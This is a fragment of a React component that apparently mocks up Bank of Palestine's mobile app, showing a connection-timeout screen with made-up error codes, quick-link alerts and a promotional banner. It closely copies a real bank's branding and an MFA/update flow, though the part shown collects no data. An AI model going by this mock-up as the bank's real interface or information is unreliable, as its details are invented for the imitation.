                    <div className="flex items-start gap-2 text-right text-xs text-gray-600 font-bold leading-relaxed" dir={currentLang === 'ar' ? 'rtl' : 'ltr'}>
                      <HelpCircle className="w-4 h-4 text-[#b01165] shrink-0 mt-0.5" />
                      <p>
                        {currentLang === 'ar' 
                          ? 'يقوم بنك فلسطين بتطبيق معايير أمنية متقدمة لحماية حساباتكم. نرجو عدم إغلاق التطبيق أثناء عملية التهيئة.' 
                          : 'Bank of Palestine applies strict safety measures to keep your data secure. Please avoid force closing the application.'}
                      </p>
                    </div>
                  </div>
                </div>
              ) : (
                /* NETWORK_ERROR STAGE */
                <div className="space-y-6 flex-1 flex flex-col items-center justify-center text-center py-4">
                  <div className="w-20 h-20 bg-rose-50 text-rose-600 rounded-full flex items-center justify-center mb-2 shadow-inner border border-rose-100 animate-bounce">
                    <WifiOff className="w-10 h-10" />
                  </div>

                  <div className="space-y-2">
                    <h2 className="text-rose-600 text-xl font-black leading-tight">
                      {currentLang === 'ar' ? 'فشل الاتصال بالإنترنت' : 'Internet Connection Failed'}
                    </h2>
                    <p className="text-xs text-gray-600 font-extrabold px-3 leading-relaxed">
                      {currentLang === 'ar' 
                        ? 'عذراً، انقطع الاتصال بخادم بنك فلسطين لتجاوز وقت الاستجابة المسموح به. يرجى التحقق من شبكة البيانات أو الواي فاي وحاول مرة أخرى.' 
                        : 'Sorry, the connection to Bank of Palestine server timed out. Please verify your mobile data or Wi-Fi connectivity and try again.'}
                    </p>
                  </div>

                  {/* Tech details error card */}
                  <div className="w-full max-w-xs bg-red-50/50 border border-red-100 rounded-2xl p-4 space-y-1 text-right" dir={currentLang === 'ar' ? 'rtl' : 'ltr'}>
                    <div className="flex items-center gap-1.5 text-xs font-black text-red-800">
                      <AlertTriangle className="w-4 h-4 shrink-0" />
                      <span>{currentLang === 'ar' ? 'معلومات الخطأ الفني:' : 'Technical Error Information:'}</span>
                    </div>
                    <div className="text-[10px] font-mono font-bold text-gray-600 space-y-0.5 pl-5 pt-1">
                      <p>CODE: BOP_NET_ERR_TIMEOUT</p>
                      <p>IP: 192.168.1.104 (LATENCY: --)</p>
                      <p>SERVER: portal.bop.ps (MFA_TIMEOUT)</p>
                    </div>
                  </div>

                  {/* Retry / Close controls */}
                  <div className="w-full max-w-xs pt-4 space-y-2">
                    <button 
                      type="button"
                      onClick={() => {
                        setSecondsLeft(60);
                        setUpdateStage('LOADING');
                      }}
                      className="w-full bg-[#b01165] hover:bg-[#8e0d51] text-white font-black text-xs py-3.5 rounded-xl transition-all shadow-md flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>{currentLang === 'ar' ? 'إعادة محاولة الاتصال' : 'Retry Server Connection'}</span>
                    </button>

                    <button 
                      type="button"
                      onClick={onClose}
                      className="w-full bg-white border border-gray-200 hover:bg-gray-50 text-gray-700 font-black text-xs py-3 rounded-xl transition-all cursor-pointer"
                    >
                      {currentLang === 'ar' ? 'إلغاء وإغلاق' : 'Cancel & Close'}
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}

        </div>

        {/* Phone Bottom Home Indicator */}
        <div className="h-4 bg-white flex items-center justify-center pb-2 shrink-0">
          <div className="w-28 h-1 bg-neutral-300 rounded-full" />
        </div>
      </div>
    </div>
  );
}

// Subcomponent: Bottom Quick Links Cards as shown in Screen 1 & 2
function BottomQuickLinks({ lang }: { lang: Language }) {
  const items = [
    {
      id: 'locations',
      title: lang === 'ar' ? 'مواقع' : 'Branches',
      icon: <MapPin className="w-5 h-5 text-[#b01165]" />
    },
    {
      id: 'about',
      title: lang === 'ar' ? 'عن بنك فلسطين' : 'About BOP',
      icon: <HelpCircle className="w-5 h-5 text-[#b01165]" />
    },
    {
      id: 'contact',
      title: lang === 'ar' ? 'اتصل بنا' : 'Contact',
      icon: <PhoneCall className="w-5 h-5 text-[#b01165]" />
    }
  ];

  const handleClick = (id: string) => {
    if (id === 'contact') {
      alert(lang === 'ar' ? 'رقم الاتصال المباشر ببنك فلسطين هو: 1700150150' : 'Direct contact center phone is: 1700150150');
    } else if (id === 'about') {
      alert(lang === 'ar' ? 'تأسس بنك فلسطين عام 1960 ليكون ركيزة البناء والتطور المالي في فلسطين.' : 'Bank of Palestine was founded in 1960 as a national pillar for development.');
    } else {
      alert(lang === 'ar' ? 'يتوفر لدينا أكثر من 70 فرعاً ومكتباً، و150 صرافاً آلياً عبر فلسطين.' : 'BOP provides more than 70 branches and 150 ATMs across Palestine.');
    }
  };

  return (
    <div className="grid grid-cols-3 gap-2.5">
      {items.map((item) => (
        <button 
          key={item.id}
          onClick={() => handleClick(item.id)}
          className="bg-white border border-gray-150 p-2.5 rounded-2xl flex flex-col items-center justify-center gap-1.5 hover:bg-rose-50/50 transition-colors shadow-sm cursor-pointer hover:border-rose-100"
        >
          {item.icon}
          <span className="text-[10px] font-black text-gray-700 text-center block whitespace-nowrap">
            {item.title}
          </span>
        </button>
      ))}
    </div>
  );
}

// Subcomponent: Beautiful dynamic Bottom Ads banner mimicking the Unsplash visual in screen 1
function BottomBanner({ lang }: { lang: Language }) {
  return (
    <div className="bg-[#b01165] text-white p-3.5 rounded-2xl relative overflow-hidden flex items-center justify-between shadow-md">
      {/* Visual background accents */}
      <div className="absolute top-0 right-0 w-24 h-24 bg-white/5 rounded-full -mr-8 -mt-8 pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-16 h-16 bg-white/5 rounded-full -ml-4 -mb-4 pointer-events-none" />

      {/* Right Column: Advertisement Content */}
      <div className="z-10 text-right space-y-1 flex-1 pl-1">
        <h4 className="text-xs font-black text-amber-300">
          {lang === 'ar' ? '10,000 $ أسبوعياً' : '10,000 $ Weekly'}
        </h4>
        <h5 className="text-[10px] font-black leading-tight text-white/90">
          {lang === 'ar' ? '& سيارة صديقة للبيئة في نهاية الحملة' : '& an Eco-Friendly Car'}
        </h5>
        <p className="text-[8px] font-bold text-white/70 leading-relaxed pt-1 max-w-[190px]">
          {lang === 'ar' 
            ? 'كل حركة دفع ببطاقات بنك فلسطين أو كود QR تزيد فرصك للربح حتى 13/09/2026.'
            : 'Payment via cards or Quick QR increases winning chances until 13/09/2026.'}
        </p>
      </div>

      {/* Left Column: Mock Illustration (Car and Card outline) */}
      <div className="w-20 shrink-0 flex flex-col items-center justify-center z-10 relative">
        <div className="w-16 h-10 bg-white/10 rounded-lg flex items-center justify-center relative border border-white/25 shadow-sm">
          <CreditCard className="w-6 h-6 text-white/80" />
          {/* Mock green leaf sticker represent Eco */}
          <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full" />
        </div>
        <div className="text-[9px] font-mono text-center text-amber-300 font-extrabold mt-1">
          VISA / QR
        </div>
      </div>
    </div>
  );
}
